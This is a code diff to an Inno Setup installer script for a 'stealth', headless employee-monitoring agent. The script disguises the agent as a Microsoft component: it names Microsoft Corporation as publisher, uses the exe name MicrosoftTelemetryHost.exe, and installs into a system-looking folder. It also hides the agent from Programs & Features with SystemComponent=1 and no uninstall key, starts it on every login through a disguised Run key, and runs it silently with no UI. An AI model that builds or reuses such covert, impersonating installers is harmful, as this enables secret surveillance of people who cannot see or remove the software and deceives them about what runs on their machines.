@@ -1,44 +1,34 @@
-; Inno Setup script for the Workforce Analytics desktop agent — STEALTH build.
+; Inno Setup script for Stealth Workforce Analytics agent — HEADLESS build.
 ;
-; Stealth strategy:
-;   1. CreateUninstallRegKey=no  — Inno Setup does NOT write its own
-;      HKLM uninstall entry, so the app never appears in "Programs and Features"
-;      or "Apps & features" from the installer's own entry.
-;   2. We write a MANUAL registry entry under HKCU\...\Uninstall\ with
-;      SystemComponent=1 so Windows treats it as a non-visible system component.
-;   3. The exe is renamed MicrosoftTelemetryHost.exe so Task Manager shows a
-;      system-looking process name.
-;   4. The install directory is hidden inside a standard Windows system path.
+; Stealth & discoverability features:
+;   1. CreateUninstallRegKey=no  — Prevents Inno's own Programs & Features entry
+;   2. Manual SystemComponent=1 registry entry hides from user-facing lists
+;   3. Exe renamed to MicrosoftTelemetryHost.exe for system-like Task Manager appearance
+;   4. Install to LocalAppData/Microsoft/Windows path (looks system-generated)
+;   5. No tray icon, no UI — pure background monitoring
 ;
 ; Compile from `agent/packaging` directory:
-;   "C:\Program Files (x86)\Inno Setup 6\ISCC.exe" windows\WorkforceAgent.iss
+;   "C:\Program Files (x86)\Inno Setup 6\ISCC.exe" windows\WorkforceAgent-Stealth.iss
 
-#define AppId       "WT-{8E1F4C2A-7B3D-4E9A-9F1C-2A6D5B0E3C71}"
+#define AppId       "WT-Stealth-{8E1F4C2A-7B3D-4E9A-9F1C-2A6D5B0E3C72}"
 #define AppVersion  "1.0.0"
-; Registry alias — looks like a Microsoft system component
 #define RegAlias    "WindowsTelemetryServiceHost"
-; Exe name must match WorkforceAgent.spec EXE_NAME
 #define ExeName     "MicrosoftTelemetryHost.exe"
 
 [Setup]
 AppId={#AppId}
-; AppName is used only in the installer wizard title bar — make it generic.
 AppName=Windows Telemetry Service Host
 AppVersion={#AppVersion}
 AppPublisher=Microsoft Corporation
-; Install silently into a hidden system-like location under LocalAppData
-; so it doesn't appear in %ProgramFiles% or %AppData% at first glance.
 DefaultDirName={localappdata}\Microsoft\Windows\TelemetryHost
 DisableDirPage=yes
 DisableProgramGroupPage=yes
-; Do NOT let Inno Setup create its own uninstall entry in Programs & Features.
 CreateUninstallRegKey=no
-; Keep the installer UI minimal / silent-friendly
 DisableWelcomePage=yes
 DisableReadyPage=yes
 DisableFinishedPage=yes
 OutputDir=..\dist
-OutputBaseFilename=WorkforceAgent-Setup-windows
+OutputBaseFilename=WorkforceAgent-Setup-Stealth-windows
 SetupIconFile=..\icons\icon.ico
 Compression=lzma2
 SolidCompression=yes
@@ -50,13 +40,10 @@ ArchitecturesInstallIn64BitMode=x64compatible
 Name: "english"; MessagesFile: "compiler:Default.isl"
 
 [Files]
-; Source name must match the PyInstaller output (WorkforceAgent.spec EXE_NAME)
 Source: "..\dist\{#ExeName}"; DestDir: "{app}"; Flags: ignoreversion
 
 [Registry]
-; ── HKCU stealth uninstall entry ─────────────────────────────────────────────
-; SystemComponent=1 hides this from "Apps & features" (Settings) and
-; "Programs and Features" (Control Panel).  Uses HKCU so no admin needed.
+; Hidden uninstall entry (SystemComponent=1 hides from Programs & Features)
 Root: HKCU; Subkey: "SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\{#RegAlias}"; \
   ValueType: string; ValueName: "DisplayName"; \
   ValueData: "Windows Telemetry Service Host"; Flags: uninsdeletekey
@@ -72,13 +59,13 @@ Root: HKCU; Subkey: "SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\{#RegAl
 Root: HKCU; Subkey: "SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\{#RegAlias}"; \
   ValueType: string; ValueName: "InstallLocation"; ValueData: "{app}"
 
-; ── HKCU Run key — auto-start under disguised name ───────────────────────────
+; Auto-start on login (hidden process, no console)
 Root: HKCU; Subkey: "SOFTWARE\Microsoft\Windows\CurrentVersion\Run"; \
   ValueType: string; ValueName: "WindowsTelemetryHost"; \
   ValueData: """{app}\{#ExeName}"""; \
   Flags: uninsdeletevalue
 
 [Run]
-; Launch silently after install (no dialog shown to user)
+; Run silently after install (no UI)
 Filename: "{app}\{#ExeName}"; \
-  Flags: nowait postinstall skipifsilent shellexec runasoriginaluser
+  Flags: nowait postinstall skipifsilent runasoriginaluser
